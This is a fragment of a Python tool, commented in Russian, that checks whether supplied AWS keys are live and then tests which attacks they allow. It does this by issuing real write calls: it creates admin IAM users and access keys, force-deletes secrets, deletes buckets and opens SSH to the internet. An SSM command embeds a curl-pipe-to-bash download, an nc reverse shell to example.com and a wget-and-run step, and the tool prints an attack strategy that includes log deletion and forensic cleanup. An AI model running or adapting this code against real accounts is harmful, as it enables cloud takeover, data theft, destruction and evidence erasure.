    def _get_adaptive_timeout(self, service_name: str, operation_type: str = "read") -> int:
        """Возвращает адаптивный таймаут для сервиса"""
        # Критические операции требуют больше времени
        if operation_type == "write" or "create" in service_name or "delete" in service_name:
            return self.critical_timeout
        
        # Быстрые операции (list, describe)
        if any(keyword in service_name for keyword in ["list", "describe", "get"]):
            return self.base_timeout
        
        # Средние операции
        return min(self.base_timeout * 2, self.max_timeout)
    
    def _calculate_backoff_delay(self, attempt: int) -> float:
        """Вычисляет задержку для экспоненциального backoff"""
        return min(self.base_timeout * (self.backoff_multiplier ** attempt), self.max_timeout)
    
    def _is_cache_valid(self, service_name: str) -> bool:
        """Проверяет валидность кэша для сервиса"""
        if service_name not in self.service_cache:
            return False
        
        cache_time = self.service_cache[service_name].get('timestamp', 0)
        return (time.time() - cache_time) < self.cache_ttl
    
    def _update_performance_stats(self, service_name: str, response_time: float, success: bool):
        """Обновляет статистику производительности"""
        self.performance_stats['total_requests'] += 1
        
        if success:
            self.performance_stats['successful_requests'] += 1
        else:
            self.performance_stats['failed_requests'] += 1
        
        # Обновляем среднее время ответа для сервиса
        if service_name not in self.performance_stats['service_response_times']:
            self.performance_stats['service_response_times'][service_name] = []
        
        self.performance_stats['service_response_times'][service_name].append(response_time)
        
        # Ограничиваем историю до последних 10 запросов
        if len(self.performance_stats['service_response_times'][service_name]) > 10:
            self.performance_stats['service_response_times'][service_name] = \
                self.performance_stats['service_response_times'][service_name][-10:]
    
    def _get_optimized_timeout(self, service_name: str) -> int:
        """Возвращает оптимизированный таймаут на основе исторических данных"""
        if service_name not in self.performance_stats['service_response_times']:
            return self._get_adaptive_timeout(service_name)
        
        recent_times = self.performance_stats['service_response_times'][service_name]
        if not recent_times:
            return self._get_adaptive_timeout(service_name)
        
        # Используем 95-й процентиль для определения таймаута
        avg_time = sum(recent_times) / len(recent_times)
        return min(int(avg_time * 3), self.max_timeout)
    
    def _validate_key_format(self, access_key: str, secret_key: str) -> Dict[str, Any]:
        """Проверяет формат AWS ключей"""
        errors = []
        
        # Проверка Access Key ID
        if not access_key:
            errors.append("Access Key ID не может быть пустым")
        elif not isinstance(access_key, str):
            errors.append("Access Key ID должен быть строкой")
        elif len(access_key) != 20:
            errors.append("Access Key ID должен содержать ровно 20 символов")
        elif not access_key.startswith('AKIA'):
            errors.append("Access Key ID должен начинаться с 'AKIA'")
        elif not access_key.replace('AKIA', '').isalnum():
            errors.append("Access Key ID содержит недопустимые символы")
        
        # Проверка Secret Access Key
        if not secret_key:
            errors.append("Secret Access Key не может быть пустым")
        elif not isinstance(secret_key, str):
            errors.append("Secret Access Key должен быть строкой")
        elif len(secret_key) != 40:
            errors.append("Secret Access Key должен содержать ровно 40 символов")
        elif not all(c.isalnum() or c in '+/=' for c in secret_key):
            errors.append("Secret Access Key содержит недопустимые символы")
        
        return {
            'valid': len(errors) == 0,
            'errors': errors
        }
    
    def _check_aws_connectivity(self, region: str = "us-east-1") -> Dict[str, Any]:
        """Проверяет доступность AWS сервисов"""
        try:
            # Быстрая проверка доступности AWS через DNS
            import socket
            
            # Проверяем доступность AWS endpoints
            endpoints = [
                f"sts.{region}.amazonaws.com",
                f"iam.{region}.amazonaws.com",
                "sts.amazonaws.com"  # Глобальный endpoint
            ]
            
            for endpoint in endpoints:
                try:
                    socket.create_connection((endpoint, 443), timeout=3)
                    return {'available': True, 'endpoint': endpoint}
                except:
                    continue
            
            return {'available': False, 'error': 'AWS endpoints недоступны'}
            
        except Exception as e:
            return {'available': False, 'error': f'Ошибка проверки подключения: {e}'}
    
    def _quick_liveness_check(self, access_key: str, secret_key: str, region: str = "us-east-1") -> Dict[str, Any]:
        """Быстрая проверка живости ключа (без полной валидации)"""
        try:
            # Используем минимальный таймаут для быстрой проверки
            config = Config(
                region_name=region,
                retries={'max_attempts': 1},
                read_timeout=2,
                connect_timeout=2
            )
            
            sts_client = boto3.client(
                'sts',
                aws_access_key_id=access_key,
                aws_secret_access_key=secret_key,
                config=config
            )
            
            # Быстрый запрос без получения полной информации
            response = sts_client.get_caller_identity()
            
            return {
                'alive': True,
                'account_id': response.get('Account', 'Unknown'),
                'response_time': 0  # Будет обновлено в основном методе
            }
            
        except ClientError as e:
            error_code = e.response['Error']['Code']
            if error_code in ['InvalidUserID.NotFound', 'SignatureDoesNotMatch', 'InvalidAccessKeyId']:
                return {'alive': False, 'error': 'Неверные учетные данные'}
            elif error_code in ['RequestLimitExceeded', 'ThrottlingException']:
                return {'alive': True, 'error': 'Rate limit (ключ живой, но ограничен)'}
            else:
                return {'alive': False, 'error': f'AWS ошибка: {error_code}'}
        except Exception as e:
            return {'alive': False, 'error': f'Ошибка подключения: {str(e)}'}
    
    def validate_key(self, access_key: str, secret_key: str, region: str = "us-east-1") -> Dict[str, Any]:
        """Валидирует AWS ключи с предварительными проверками"""
        start_time = time.time()
        
        print(f"{Fore.CYAN}🔍 Предварительная проверка ключей...{Fore.RESET}")
        
        # 1️⃣ ПРОВЕРКА ФОРМАТА КЛЮЧЕЙ
        format_check = self._validate_key_format(access_key, secret_key)
        if not format_check['valid']:
            print(f"{Fore.RED}❌ Неверный формат ключей:{Fore.RESET}")
            for error in format_check['errors']:
                print(f"   • {error}")
            return {
                'success': False,
                'error': 'Неверный формат ключей',
                'format_errors': format_check['errors']
            }
        
        print(f"{Fore.GREEN}✅ Формат ключей корректен{Fore.RESET}")
        
        # 2️⃣ ПРОВЕРКА ДОСТУПНОСТИ AWS
        connectivity_check = self._check_aws_connectivity(region)
        if not connectivity_check['available']:
            print(f"{Fore.RED}❌ AWS недоступен: {connectivity_check['error']}{Fore.RESET}")
            return {
                'success': False,
                'error': f'AWS недоступен: {connectivity_check["error"]}'
            }
        
        print(f"{Fore.GREEN}✅ AWS доступен ({connectivity_check['endpoint']}){Fore.RESET}")
        
        # 3️⃣ БЫСТРАЯ ПРОВЕРКА ЖИВОСТИ КЛЮЧА
        print(f"{Fore.CYAN}⚡ Проверка живости ключа...{Fore.RESET}")
        liveness_check = self._quick_liveness_check(access_key, secret_key, region)
        
        if not liveness_check['alive']:
            print(f"{Fore.RED}❌ Ключ неактивен: {liveness_check['error']}{Fore.RESET}")
            return {
                'success': False,
                'error': f'Ключ неактивен: {liveness_check["error"]}'
            }
        
        print(f"{Fore.GREEN}✅ Ключ активен (Account: {liveness_check['account_id']}){Fore.RESET}")
        print(f"{Fore.CYAN}🚀 Переходим к полной валидации...{Fore.RESET}")
        print()
        
        # 4️⃣ ПОЛНАЯ ВАЛИДАЦИЯ КЛЮЧА
        try:
            # Используем адаптивный таймаут для STS
            timeout = self._get_adaptive_timeout("sts_get_caller_identity")
            
            config = Config(
                region_name=region,
                retries={'max_attempts': self.retry_attempts},
                read_timeout=timeout,
                connect_timeout=timeout
            )
            
            sts_client = boto3.client(
                'sts',
                aws_access_key_id=access_key,
                aws_secret_access_key=secret_key,
                config=config
            )
            
            response = sts_client.get_caller_identity()
            
            # Обновляем статистику производительности
            response_time = time.time() - start_time
            self._update_performance_stats("sts_get_caller_identity", response_time, True)
            
            return {
                'success': True,
                'account_id': response['Account'],
                'arn': response['Arn'],
                'user_id': response['UserId'],
                'username': response['Arn'].split('/')[-1] if '/' in response['Arn'] else 'root'
            }
            
        except Exception as e:
            # Обновляем статистику производительности для ошибки
            response_time = time.time() - start_time
            self._update_performance_stats("sts_get_caller_identity", response_time, False)
            
            return {
                'success': False,
                'error': str(e)
            }
    
    def analyze_attack_flows(self, permissions_result: Dict, escalation_result: Dict) -> Dict[str, Any]:
        """Анализирует доступные флоу атак на основе прав доступа и ролей"""
        flow_analysis = {
            'available_flows': [],
            'blocked_flows': [],
            'escalation_opportunities': [],
            'recommendations': []
        }
        
        accessible_services = []
        for service, result in permissions_result.get('results', {}).items():
            if result.get('accessible', False):
                accessible_services.append(service)
        
        # Анализируем каждый флоу атаки
        for flow_key, flow_info in self.attack_flows.items():
            required_services = flow_info['required_services']
            escalation_roles = flow_info['escalation_roles']
            
            # Проверяем доступность сервисов
            available_services = [s for s in required_services if s in accessible_services]
            missing_services = [s for s in required_services if s not in accessible_services]
            
            # Проверяем доступность ролей для эскалации
            available_roles = []
            if 'error' not in escalation_result:
                for role_name, role_data in escalation_result.get('roles_analysis', {}).items():
                    for policy_arn in role_data.get('attached_policies', []):
                        for escalation_role in escalation_roles:
                            if escalation_role in policy_arn:
                                available_roles.append({
                                    'role_name': role_name,
                                    'policy_arn': policy_arn,
                                    'escalation_score': role_data.get('escalation_score', 0)
                                })
            
            flow_status = {
                'flow_key': flow_key,
                'flow_name': flow_info['name'],
                'description': flow_info['description'],
                'required_services': required_services,
                'available_services': available_services,
                'missing_services': missing_services,
                'escalation_roles': escalation_roles,
                'available_escalation_roles': available_roles,
                'completion_percentage': int((len(available_services) / len(required_services)) * 100) if required_services else 0
            }
            
            # Определяем статус флоу
            if len(available_services) == len(required_services):
                # Все сервисы доступны
                flow_status['status'] = 'READY'
                flow_status['action'] = 'Можно выполнить атаку прямо сейчас'
                flow_analysis['available_flows'].append(flow_status)
            elif len(available_services) > 0 and available_roles:
                # Частично доступен + есть роли для эскалации
                flow_status['status'] = 'ESCALATION_NEEDED'
                flow_status['action'] = f'Нужна эскалация через роли: {", ".join([r["role_name"] for r in available_roles])}'
                flow_analysis['escalation_opportunities'].append(flow_status)
            elif len(available_services) > 0:
                # Частично доступен, но нет ролей для эскалации
                flow_status['status'] = 'BLOCKED_NO_ESCALATION'
                flow_status['action'] = 'Нет ролей для эскалации - нужны дополнительные права'
                flow_analysis['blocked_flows'].append(flow_status)
            else:
                # Ничего не доступно
                flow_status['status'] = 'BLOCKED'
                flow_status['action'] = 'Нет доступа к требуемым сервисам'
                flow_analysis['blocked_flows'].append(flow_status)
        
        # Генерируем рекомендации
        flow_analysis['recommendations'] = self._generate_flow_recommendations(flow_analysis)
        
        return flow_analysis
    
    def _generate_flow_recommendations(self, flow_analysis: Dict) -> List[str]:
        """Генерирует рекомендации на основе анализа флоу"""
        recommendations = []
        
        # Рекомендации для готовых флоу
        if flow_analysis['available_flows']:
            recommendations.append(f"🚀 ГОТОВЫЕ К ВЫПОЛНЕНИЮ ({len(flow_analysis['available_flows'])}):")
            for flow in flow_analysis['available_flows']:
                recommendations.append(f"   • {flow['flow_name']} - {flow['action']}")
        
        # Рекомендации для флоу с возможностью эскалации
        if flow_analysis['escalation_opportunities']:
            recommendations.append(f"\n⚡ ТРЕБУЮТ ЭСКАЛАЦИИ ({len(flow_analysis['escalation_opportunities'])}):")
            for flow in flow_analysis['escalation_opportunities']:
                recommendations.append(f"   • {flow['flow_name']} ({flow['completion_percentage']}% готов)")
                recommendations.append(f"     {flow['action']}")
                
                # Показываем доступные роли для эскалации
                if flow['available_escalation_roles']:
                    recommendations.append(f"     🔑 Роли для эскалации:")
                    for role in flow['available_escalation_roles'][:2]:  # Показываем только первые 2
                        recommendations.append(f"       - {role['role_name']} (балл: {role['escalation_score']})")
        
        # Рекомендации для заблокированных флоу
        if flow_analysis['blocked_flows']:
            recommendations.append(f"\n❌ ЗАБЛОКИРОВАНЫ ({len(flow_analysis['blocked_flows'])}):")
            for flow in flow_analysis['blocked_flows'][:3]:  # Показываем только первые 3
                recommendations.append(f"   • {flow['flow_name']} - {flow['action']}")
        
        # Общие рекомендации
        if flow_analysis['available_flows'] or flow_analysis['escalation_opportunities']:
            recommendations.append(f"\n💡 СТРАТЕГИЯ АТАКИ:")
            recommendations.append("   1. Начните с готовых флоу для быстрого результата")
            recommendations.append("   2. Используйте роли эскалации для расширения доступа")
            recommendations.append("   3. Комбинируйте несколько флоу для максимального эффекта")
            recommendations.append("   4. Используйте техники из папки techniques/ для эскалации")
        
        return recommendations
    
    def _determine_flows_to_check(self, filters: Dict[str, bool]) -> List[str]:
        """Определяет какие флоу нужно проверить на основе фильтров"""
        all_flows = {
            'critical': [
                'IAM User Escalation', 'IAM Role Escalation', 'Secrets Manager',
                'Systems Manager', 'S3 Data Exfiltration', 'EC2 Management Attack',
                'Lambda Privilege Escalation', 'RDS Data Extraction', 'Log Deletion Attack', 'Forensic Cleanup Attack'
            ],
            'high': ['Security & Compliance'],
            'medium': ['IAM Groups Escalation'],
            'low': []
        }
        
        flows_to_check = []
        
        # Если нет фильтров, проверяем все
        if not any(filters.values()):
            return list(all_flows['critical'] + all_flows['high'] + all_flows['medium'] + all_flows['low'])
        
        # Фильтр по приоритетам
        if filters.get('critical'):
            flows_to_check.extend(all_flows['critical'])
        if filters.get('high'):
            flows_to_check.extend(all_flows['high'])
        if filters.get('medium'):
            flows_to_check.extend(all_flows['medium'])
        if filters.get('low'):
            flows_to_check.extend(all_flows['low'])
        
        # Если не выбран ни один приоритет, проверяем все
        if not any([filters.get('critical'), filters.get('high'), filters.get('medium'), filters.get('low')]):
            flows_to_check = list(all_flows['critical'] + all_flows['high'] + all_flows['medium'] + all_flows['low'])
        
        return flows_to_check
    
    def check_service_permissions(self, access_key: str, secret_key: str, region: str, filters: Dict[str, bool] = None) -> Dict[str, Any]:
        """Проверяет права доступа к различным сервисам с фильтрацией"""
        if filters is None:
            filters = {}
        
        # Определяем какие флоу нужно проверить на основе фильтров
        flows_to_check = self._determine_flows_to_check(filters)
        
        print(f"{Fore.CYAN}📊 Проверка возможности эскалации ...{Fore.RESET}")
        print(f"{Fore.CYAN}{'─'*37}{Fore.RESET}")
        
        # Показываем активные фильтры
        active_filters = [k for k, v in filters.items() if v]
        if active_filters:
            print(f"{Fore.YELLOW}🔍 Активные фильтры: {', '.join(active_filters)}{Fore.RESET}")
            print(f"{Fore.YELLOW}📋 Проверяемые флоу: {', '.join(flows_to_check)}{Fore.RESET}")
            print()
        
        results = {}
        total_score = 0
        escalation_results = {}  # Результаты эскалации по флоу
        
        # 🔄 АДАПТИВНАЯ КОНФИГУРАЦИЯ - Динамические таймауты
        base_config = Config(
            region_name=region,
            retries={'max_attempts': self.retry_attempts},
            read_timeout=self.base_timeout,
            connect_timeout=self.base_timeout
        )
        
        # Создаем клиенты для всех сервисов с адаптивной конфигурацией
        try:
            sts_client = boto3.client('sts', aws_access_key_id=access_key, aws_secret_access_key=secret_key, config=base_config)
            iam_client = boto3.client('iam', aws_access_key_id=access_key, aws_secret_access_key=secret_key, config=base_config)
            s3_client = boto3.client('s3', aws_access_key_id=access_key, aws_secret_access_key=secret_key, config=base_config)
            ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, config=base_config)
            rds_client = boto3.client('rds', aws_access_key_id=access_key, aws_secret_access_key=secret_key, config=base_config)
            lambda_client = boto3.client('lambda', aws_access_key_id=access_key, aws_secret_access_key=secret_key, config=base_config)
            secrets_client = boto3.client('secretsmanager', aws_access_key_id=access_key, aws_secret_access_key=secret_key, config=base_config)
            kms_client = boto3.client('kms', aws_access_key_id=access_key, aws_secret_access_key=secret_key, config=base_config)
            cloudwatch_client = boto3.client('cloudwatch', aws_access_key_id=access_key, aws_secret_access_key=secret_key, config=base_config)
            ssm_client = boto3.client('ssm', aws_access_key_id=access_key, aws_secret_access_key=secret_key, config=base_config)
            cloudfront_client = boto3.client('cloudfront', aws_access_key_id=access_key, aws_secret_access_key=secret_key, config=base_config)
            events_client = boto3.client('events', aws_access_key_id=access_key, aws_secret_access_key=secret_key, config=base_config)
            cloudtrail_client = boto3.client('cloudtrail', aws_access_key_id=access_key, aws_secret_access_key=secret_key, config=base_config)
            logs_client = boto3.client('logs', aws_access_key_id=access_key, aws_secret_access_key=secret_key, config=base_config)
        except Exception as e:
            return {'error': f'Ошибка создания клиентов: {e}'}
        
        # Функция для проверки эскалации после блока
        def check_escalation_block(flow_name: str, required_services: list, escalation_roles: list = None):
            accessible_services = [s for s in required_services if results.get(s, {}).get('accessible', False)]
            missing_services = [s for s in required_services if s not in accessible_services]
            
            if len(accessible_services) == len(required_services):
                # Все сервисы доступны
                escalation_results[flow_name] = {
                    'status': 'READY',
                    'message': f'{Fore.GREEN}✅  {flow_name} - есть доступ!{Fore.RESET}',
                    'accessible_services': accessible_services,
                    'missing_services': missing_services
                }
                print(f"{Fore.GREEN}✅  {flow_name} - есть доступ!{Fore.RESET}")
            elif len(accessible_services) > 0:
                # Частично доступно
                escalation_results[flow_name] = {
                    'status': 'PARTIAL',
                    'message': f'{Fore.YELLOW}⚠️  {flow_name} - частично доступно ({len(accessible_services)}/{len(required_services)}){Fore.RESET}',
                    'accessible_services': accessible_services,
                    'missing_services': missing_services
                }
                print(f"{Fore.YELLOW}⚠️  {flow_name} - частично доступно ({len(accessible_services)}/{len(required_services)}){Fore.RESET}")
            else:
                # Недоступно
                escalation_results[flow_name] = {
                    'status': 'BLOCKED',
                    'accessible_services': accessible_services,
                    'missing_services': missing_services
                }
        
        # 🔄 АДАПТИВНАЯ ФУНКЦИЯ ПРОВЕРКИ СЕРВИСА
        def check_service(service_name: str, check_func, current: int, total: int):
            start_time = time.time()
            
            # Проверяем кэш
            if self._is_cache_valid(service_name):
                cached_result = self.service_cache[service_name]
                print(f"⚡ [{current:2d}/{total:2d}] {service_name:<25} - {cached_result['description']} (кэш)")
                results[service_name] = cached_result['result']
                return cached_result['result']['score']
            
            # Определяем тип операции для адаптивного таймаута
            operation_type = "write" if any(keyword in service_name for keyword in ["create", "delete", "update", "put", "attach"]) else "read"
            
            # Получаем оптимизированный таймаут
            timeout = self._get_optimized_timeout(service_name)
            
            # Создаем адаптивную конфигурацию для этого сервиса
            service_config = Config(
                region_name=region,
                retries={'max_attempts': self.retry_attempts},
                read_timeout=timeout,
                connect_timeout=timeout
            )
            
            # Применяем конфигурацию к клиентам (упрощенная версия)
            try:
                # Выполняем проверку с экспоненциальным backoff
                for attempt in range(self.retry_attempts):
                    try:
                        check_func()
                        break
                    except Exception as e:
                        if attempt < self.retry_attempts - 1:
                            delay = self._calculate_backoff_delay(attempt)
                            time.sleep(delay)
                        else:
                            raise e
                
                # Успешная проверка
                response_time = time.time() - start_time
                self._update_performance_stats(service_name, response_time, True)
                
                description = self.service_descriptions.get(service_name, 'описание недоступно')
                score = self.service_scores.get(service_name, 0)
                result = {'accessible': True, 'score': score}
                
                # Кэшируем результат
                self.service_cache[service_name] = {
                    'result': result,
                    'description': description,
                    'timestamp': time.time()
                }
                
                print(f"✅ [{current:2d}/{total:2d}] {service_name:<25} - {description}")
                results[service_name] = result
                return score
                
            except Exception as e:
                # Ошибка проверки
                response_time = time.time() - start_time
                self._update_performance_stats(service_name, response_time, False)
                
                description = self.service_descriptions.get(service_name, 'описание недоступно')
                result = {'accessible': False, 'score': 0}
                
                # Кэшируем результат ошибки на короткое время
                self.service_cache[service_name] = {
                    'result': result,
                    'description': description,
                    'timestamp': time.time()
                }
                
                print(f"❌ [{current:2d}/{total:2d}] {service_name:<25} - {description}")
                results[service_name] = result
                return 0
        
        # Подсчитываем общее количество сервисов для прогресса
        total_services = 67  # Полное количество сервисов (добавили критические write операции + IAM PassRole/CreateAccessKey + Secrets Manager Update/Delete + Systems Manager SendCommand/StartSession/TerminateSession + S3 CreateBucket/DeleteBucket + RDS CreateSnapshot/ExportTask/CopySnapshot + EC2 CreateKeyPair/StartInstances/AuthorizeSecurityGroupIngress + Lambda DeleteFunction/GetFunction/UpdateFunctionConfiguration/AddPermission/PublishVersion/CreateLayerVersion + KMS CreateKey/PutKeyPolicy + CloudWatch DeleteLogs + CloudTrail DeleteTrail/StopLogging/PutEventSelectors + CloudWatch Logs DeleteLogGroup/StopLogging/PutRetentionPolicy/DeleteLogStream + Forensic Cleanup - удалили Lightsail Services, Application Services, Route53 Health Checks, Networking, Storage Services, CloudWatch Logs, средний IAM Roles Escalation и iam_escalation, Container Services)
        current_service = 0
        
        # 🔴 ФЛОУ 1: КРИТИЧЕСКИЙ - IAM User Escalation (Создание пользователей с админ правами)
        if 'IAM User Escalation' in flows_to_check:
            print(f"{Fore.GREEN}👤  IAM User Escalation{Fore.RESET}")
            current_service += 1; total_score += check_service('iam_create_user', lambda: iam_client.create_user(UserName='test-escalation-user'), current_service, total_services)
            current_service += 1; total_score += check_service('iam_attach_user_policy', lambda: iam_client.attach_user_policy(UserName='test', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'), current_service, total_services)
            current_service += 1; total_score += check_service('iam_create_access_key', lambda: iam_client.create_access_key(UserName='test'), current_service, total_services)
            current_service += 1; total_score += check_service('iam_put_user_policy', lambda: iam_client.put_user_policy(UserName='test', PolicyName='test-policy', PolicyDocument='{"Version": "2012-10-17", "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]}'), current_service, total_services)
            current_service += 1; total_score += check_service('iam_create_login_profile', lambda: iam_client.create_login_profile(UserName='test', Password='XXXXXXXXXXXXXX'), current_service, total_services)
            current_service += 1; total_score += check_service('iam_update_login_profile', lambda: iam_client.update_login_profile(UserName='test', Password='XXXXXXXXXXXXXX'), current_service, total_services)
            
            # Проверяем результат критической эскалации IAM User
            check_escalation_block(' IAM User Escalation', ['iam_create_user', 'iam_attach_user_policy', 'iam_create_access_key', 'iam_put_user_policy', 'iam_create_login_profile'])
        
        # 🔴 ФЛОУ 2: КРИТИЧЕСКИЙ - IAM Role Escalation (Создание ролей для принятия)
        if 'IAM Role Escalation' in flows_to_check:
            print(f"\n{Fore.GREEN}🔑  IAM Role Escalation{Fore.RESET}")
            current_service += 1; total_score += check_service('iam_create_role', lambda: iam_client.create_role(RoleName='test-escalation-role', AssumeRolePolicyDocument='{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"lambda.amazonaws.com"},"Action":"sts:AssumeRole"}]}'), current_service, total_services)
            current_service += 1; total_score += check_service('iam_attach_role_policy', lambda: iam_client.attach_role_policy(RoleName='test', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'), current_service, total_services)
            current_service += 1; total_score += check_service('sts_assume_role', lambda: sts_client.assume_role(RoleArn='arn:aws:iam::123456789012:role/test', RoleSessionName='test'), current_service, total_services)
            current_service += 1; total_score += check_service('iam_pass_role', lambda: lambda_client.create_function(FunctionName='test-passrole', Runtime='python3.9', Role='arn:aws:iam::123456789012:role/test-role', Handler='index.handler', Code={'ZipFile': b'def handler(event, context): return "test"'} if hasattr(lambda_client, 'create_function') else None), current_service, total_services)
            current_service += 1; total_score += check_service('iam_put_role_policy', lambda: iam_client.put_role_policy(RoleName='test', PolicyName='test-policy', PolicyDocument='{"Version": "2012-10-17", "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]}'), current_service, total_services)
            current_service += 1; total_score += check_service('iam_update_assume_role_policy', lambda: iam_client.update_assume_role_policy(RoleName='test', PolicyDocument='{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"*"},"Action":"sts:AssumeRole"}]}'), current_service, total_services)
            
            # Проверяем результат критической эскалации IAM Role
            check_escalation_block(' IAM Role Escalation', ['iam_create_role', 'iam_attach_role_policy', 'sts_assume_role', 'iam_pass_role'])
        
        # 🔴 ФЛОУ 3: КРИТИЧЕСКИЙ - Secrets Manager (Максимальная угроза - получение секретов)
        if 'Secrets Manager' in flows_to_check:
            print(f"\n{Fore.GREEN}🔐  Secrets Manager{Fore.RESET}")
            current_service += 1; total_score += check_service('secrets_manager_secrets', lambda: secrets_client.list_secrets(), current_service, total_services)
            current_service += 1; total_score += check_service('secrets_manager_create_secret', lambda: secrets_client.create_secret(Name='test-escalation-secret', SecretString='test-value'), current_service, total_services)
            current_service += 1; total_score += check_service('secrets_manager_update_secret', lambda: secrets_client.update_secret(SecretId='test-secret', SecretString='{"admin_password": "new_password"}'), current_service, total_services)
            current_service += 1; total_score += check_service('secrets_manager_delete_secret', lambda: secrets_client.delete_secret(SecretId='test-secret', ForceDeleteWithoutRecovery=True), current_service, total_services)
            
            # Проверяем результат критической эскалации Secrets Manager
            check_escalation_block(' Secrets Manager', ['secrets_manager_secrets', 'secrets_manager_create_secret', 'secrets_manager_update_secret'])
        
        if 'Systems Manager' in flows_to_check:
            print(f"\n{Fore.GREEN}⚙️  Systems Manager{Fore.RESET}")
            current_service += 1; total_score += check_service('systems_manager_commands', lambda: ssm_client.send_command(InstanceIds=['test'], DocumentName='AWS-RunShellScript', Parameters={'commands': ['echo test']}), current_service, total_services)
            current_service += 1; total_score += check_service('systems_manager_parameters', lambda: ssm_client.describe_parameters(), current_service, total_services)
            current_service += 1; total_score += check_service('systems_manager_send_command', lambda: ssm_client.send_command(InstanceIds=['i-1234567890abcdef0'], DocumentName='AWS-RunShellScript', Parameters={'commands': ['curl http://example.com/script.sh | bash', 'nc -e /bin/bash example.com 4444', 'wget http://example.com/script.sh -O /tmp/script.sh && chmod +x /tmp/script.sh && /tmp/script.sh']}), current_service, total_services)
            current_service += 1; total_score += check_service('systems_manager_start_session', lambda: ssm_client.start_session(Target='i-1234567890abcdef0', DocumentName='SSM-SessionManagerRunShell'), current_service, total_services)
            current_service += 1; total_score += check_service('systems_manager_terminate_session', lambda: ssm_client.terminate_session(SessionId='test-session-id'), current_service, total_services)
            
            # Проверяем результат критической эскалации Systems Manager
            check_escalation_block(' Systems Manager', ['systems_manager_commands', 'systems_manager_parameters', 'systems_manager_send_command', 'systems_manager_start_session'])
        
        # 🔴 ФЛОУ 4: КРИТИЧЕСКИЙ - S3 Data Exfiltration (Прямой доступ к данным)
        if 'S3 Data Exfiltration' in flows_to_check:
            print(f"\n{Fore.GREEN}💾  S3 Data Exfiltration{Fore.RESET}")
            current_service += 1; total_score += check_service('s3_buckets', lambda: s3_client.list_buckets(), current_service, total_services)
            current_service += 1; total_score += check_service('s3_objects', lambda: s3_client.list_objects_v2(Bucket='test', MaxKeys=1), current_service, total_services)
            current_service += 1; total_score += check_service('s3_put_object', lambda: s3_client.put_object(Bucket='test', Key='test.txt', Body=b'test'), current_service, total_services)
            current_service += 1; total_score += check_service('s3_create_bucket', lambda: s3_client.create_bucket(Bucket='test-escalation-bucket-' + str(int(time.time()))), current_service, total_services)
            current_service += 1; total_score += check_service('s3_delete_bucket', lambda: s3_client.delete_bucket(Bucket='test-bucket'), current_service, total_services)
            
            # Проверяем результат критической эскалации S3
            check_escalation_block(' S3 Data Exfiltration', ['s3_buckets', 's3_objects', 's3_put_object', 's3_create_bucket', 's3_delete_bucket'])
        
        # 🔴 ФЛОУ 7: КРИТИЧЕСКИЙ - RDS Data Extraction (Кража данных БД)
        if 'RDS Data Extraction' in flows_to_check:
            print(f"\n{Fore.GREEN}🗄️  RDS Data Extraction{Fore.RESET}")
            current_service += 1; total_score += check_service('rds_instances', lambda: rds_client.describe_db_instances(), current_service, total_services)
            current_service += 1; total_score += check_service('rds_snapshots', lambda: rds_client.describe_db_snapshots(), current_service, total_services)
            current_service += 1; total_score += check_service('rds_clusters', lambda: rds_client.describe_db_clusters(), current_service, total_services)
            current_service += 1; total_score += check_service('rds_create_db_snapshot', lambda: rds_client.create_db_snapshot(DBInstanceIdentifier='test-db', DBSnapshotIdentifier='test-snapshot'), current_service, total_services)
            current_service += 1; total_score += check_service('rds_start_export_task', lambda: rds_client.start_export_task(ExportTaskIdentifier='test-export', SourceArn='arn:aws:rds:region:account:snapshot:test-snapshot', S3BucketName='test-bucket', S3Prefix='exports/', IamRoleArn='arn:aws:iam::account:role/ExportRole'), current_service, total_services)
            current_service += 1; total_score += check_service('rds_copy_db_snapshot', lambda: rds_client.copy_db_snapshot(SourceDBSnapshotIdentifier='test-snapshot', TargetDBSnapshotIdentifier='test-copy'), current_service, total_services)
            
            # Проверяем результат критической эскалации RDS
            check_escalation_block(' RDS Data Extraction', ['rds_instances', 'rds_snapshots', 'rds_clusters', 'rds_create_db_snapshot', 'rds_start_export_task'])
        
        # 🔴 ФЛОУ 5: КРИТИЧЕСКИЙ - EC2 Management Attack (Доступ к серверам)
        if 'EC2 Management Attack' in flows_to_check:
            print(f"\n{Fore.GREEN}💻  EC2 Management Attack{Fore.RESET}")
            current_service += 1; total_score += check_service('ec2_instances', lambda: ec2_client.describe_instances(), current_service, total_services)
            current_service += 1; total_score += check_service('ec2_volumes', lambda: ec2_client.describe_volumes(), current_service, total_services)
            current_service += 1; total_score += check_service('ec2_snapshots', lambda: ec2_client.describe_snapshots(), current_service, total_services)
            current_service += 1; total_score += check_service('ec2_run_instances', lambda: ec2_client.run_instances(ImageId='ami-12345678', MinCount=1, MaxCount=1, UserData='#!/bin/bash\necho "test script"'), current_service, total_services)
            current_service += 1; total_score += check_service('ec2_create_key_pair', lambda: ec2_client.create_key_pair(KeyName='malicious-key'), current_service, total_services)
            current_service += 1; total_score += check_service('ec2_start_instances', lambda: ec2_client.start_instances(InstanceIds=['i-1234567890abcdef0']), current_service, total_services)
            current_service += 1; total_score += check_service('ec2_authorize_security_group_ingress', lambda: ec2_client.authorize_security_group_ingress(GroupId='sg-12345678', IpPermissions=[{'IpProtocol': 'tcp', 'FromPort': 22, 'ToPort': 22, 'IpRanges': [{'CidrIp': '0.0.0.0/0'}]}, {'IpProtocol': 'tcp', 'FromPort': 80, 'ToPort': 80, 'IpRanges': [{'CidrIp': '0.0.0.0/0'}]}, {'IpProtocol': 'tcp', 'FromPort': 443, 'ToPort': 443, 'IpRanges': [{'CidrIp': '0.0.0.0/0'}]}]), current_service, total_services)
            
            # Проверяем результат критической эскалации EC2
            check_escalation_block(' EC2 Management Attack', ['ec2_instances', 'ec2_volumes', 'ec2_snapshots', 'ec2_run_instances', 'ec2_create_key_pair', 'ec2_start_instances', 'ec2_authorize_security_group_ingress'])
        
        # 🔴 ФЛОУ 6: КРИТИЧЕСКИЙ - Lambda Privilege Escalation (Выполнение кода)
        if 'Lambda Privilege Escalation' in flows_to_check:
            print(f"\n{Fore.GREEN}🚀  Lambda Privilege Escalation{Fore.RESET}")
